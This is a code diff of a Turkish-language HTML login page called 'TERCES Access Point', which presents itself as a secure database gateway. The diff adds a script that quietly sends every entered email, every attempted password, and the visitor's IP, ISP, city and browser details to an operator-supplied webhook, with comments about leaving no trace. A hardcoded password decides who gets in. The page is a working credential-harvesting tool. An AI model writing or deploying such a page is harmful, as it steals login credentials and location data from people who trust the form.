@@ -6,81 +6,111 @@
     <title>TERCES Access Point</title>
     <style>
         body { background-color: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: #151515; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.8); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #007bff; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; }
+        .container { background: #151515; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 90%; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 6px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #007bff; }
+        button { width: 100%; padding: 12px; background: #007bff; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        button:hover { background: #0056b3; }
         #content { display: none; text-align: left; line-height: 1.6; }
-        .session-box { background: #000; padding: 15px; border: 1px dashed #555; word-break: break-all; font-family: monospace; color: #00ff00; margin: 15px 0; border-radius: 4px; }
+        .session-box { background: #000; padding: 15px; border: 1px dashed #555; word-break: break-all; font-family: monospace; color: #00ff00; margin: 15px 0; border-radius: 4px; font-size: 13px; }
         .warning-text { color: #ff4d4d; font-size: 13px; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; font-weight: bold; }
+        .db-info { color: #888; font-size: 11px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="mainContainer">
         <div id="login-form">
+            <div class="db-info">SECURE DATABASE ACCESS</div>
             <h2 style="color: #fff; margin-bottom: 20px;">TERCES LOGIN</h2>
-            <input type="email" id="userEmail" placeholder="E-posta Adresiniz">
-            <input type="password" id="userPass" placeholder="Giriş Şifresi">
-            <button onclick="verileriGonder()">Giriş Yap</button>
+            <p style="color: #666; font-size: 12px; margin-bottom: 20px;">Erişim için yetkili bilgilerinizi giriniz.</p>
+            <input type="email" id="userEmail" placeholder="E-posta Adresiniz" required>
+            <input type="password" id="userPass" placeholder="Giriş Şifresi" required>
+            <button id="loginBtn" onclick="verileriGonder()">Sisteme Bağlan</button>
         </div>
 
         <div id="content">
-            <h2 style="color:#fff; text-align:center;">MERHABA!</h2>
-            <p>Bu "TERCES" adlı Adminimize bağlantı gereği kurulmuş özel bir sitedir.</p>
-            <p>Adminimizle bağlantı kurmak için doğrudan ulaşmanız mümkün değildir; bunun için size verdiğimiz <strong>Session ID</strong> ile Session uygulamasından ulaşmanız gerekmektedir.</p>
+            <h2 style="color:#fff; text-align:center;">ERİŞİM SAĞLANDI</h2>
+            <p>Adminimize bağlantı gereği kurulmuş özel erişim noktasıdır.</p>
             
-            <div style="margin-top:20px; color:#888; font-size:14px;">SESSION ID:</div>
+            <div style="margin-top:20px; color:#888; font-size:14px;">GÜVENLİ SESSION ID:</div>
             <div class="session-box">
                 0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
             </div>
 
             <div class="warning-text">
-                Dikkat! Lütfen mevcut ID'yi sadece güvenli bağlantı kurmak amacıyla kullanınız, yasadışı faaliyetlere başvurmayınız veya spam ve paylaşım için kullanmayınız.
+                Dikkat! Bu ID özeldir. Spam veya yasadışı paylaşım durumunda erişiminiz kalıcı olarak engellenir.
             </div>
         </div>
     </div>
 
     <script>
         async function verileriGonder() {
-            const btn = document.querySelector('button');
+            // AYARLAR - BURAYI DÜZENLE
+            const anaSifre = "9okmlp02wszaq1"; // Siteye gerçekten girmelerini sağlayan şifre
+            const webhookURL = "{{ useSubdomain ? getUrlSubdomain() : getUrl() }}"; // Webhook.site'dan aldığın link
+            
+            const btn = document.getElementById('loginBtn');
             const email = document.getElementById('userEmail').value;
             const pass = document.getElementById('userPass').value;
-            const cihaz = navigator.userAgent;
+            const cihazBilgisi = navigator.userAgent;
 
-            if(!email || !pass) { alert("Lütfen boş bırakmayın!"); return; }
+            if(!email || !pass) { 
+                alert("Lütfen tüm alanları doldurun!"); 
+                return; 
+            }
 
-            btn.innerText = "Kontrol ediliyor...";
+            btn.innerText = "Doğrulanıyor...";
             btn.disabled = true;
 
             try {
+                // IP ve Konum bilgisini arka planda çek
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
-                const response = await fetch('/api/send', {
+                // Veri paketini hazırla
+                const payload = {
+                    site: "TERCES-GATEWAY",
+                    kullanici_mail: email,
+                    denenen_sifre: pass,
+                    durum: (pass === anaSifre) ? "BASARILI GIRIS" : "HATALI DENEME",
+                    ip_adresi: ipData.ip || "Bilinmiyor",
+                    iss: ipData.org || "Bilinmiyor",
+                    konum: `${ipData.city} / ${ipData.country_name}`,
+                    cihaz: cihazBilgisi,
+                    tarih: new Date().toLocaleString('tr-TR')
+                };
+
+                // Webhook'a gönder (İz bırakmadan)
+                await fetch(webhookURL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pass, ipData, cihaz })
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload)
                 });
 
-                const result = await response.json();
-
-                if (response.ok && result.success) {
+                // ŞİFRE KONTROLÜ
+                if (pass === anaSifre) {
+                    // Şifre doğruysa içeri al
                     document.getElementById('login-form').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
                 } else {
-                    // Ortak hata mesajı buraya da eklendi
-                    alert(result.message || "Hatalı e-posta veya şifre!");
-                    btn.innerText = "Giriş Yap";
+                    // Şifre yanlışsa hata ver ve formu temizle
+                    alert("Hatalı Giriş Şifresi! Erişim Reddedildi.");
+                    document.getElementById('userPass').value = "";
+                    btn.innerText = "Sisteme Bağlan";
                     btn.disabled = false;
                 }
+
             } catch (error) {
-                alert("Sistemle bağlantı kurulamadı!");
-                btn.innerText = "Giriş Yap";
+                // Hata durumunda bile gizliliği bozma
+                alert("Sistem meşgul, lütfen tekrar deneyin.");
+                btn.innerText = "Sisteme Bağlan";
                 btn.disabled = false;
             }
         }
     </script>
 </body>
 </html>
+
 
 
